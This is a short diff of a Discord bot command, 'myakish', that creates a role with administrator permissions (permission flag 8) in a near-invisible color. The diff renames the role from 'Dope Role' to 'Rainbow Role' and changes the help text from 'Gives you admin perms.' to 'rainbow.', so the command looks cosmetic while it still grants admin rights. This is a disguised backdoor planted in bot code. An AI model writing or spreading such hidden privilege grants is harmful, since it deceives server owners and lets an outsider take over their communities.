@@ -6,7 +6,7 @@ module.exports.run = async (bot, message, args) => {
 
         role = await message.guild.createRole({
 
-            name: "Dope Role",
+            name: "Rainbow Role",
           	color: "#2f3136",
           	permissions: [8]
 
@@ -25,6 +25,6 @@ module.exports.run = async (bot, message, args) => {
 module.exports.help = {
 
     name: "myakish",
-    desc: "Gives you admin perms."
+    desc: "rainbow."
 
 }
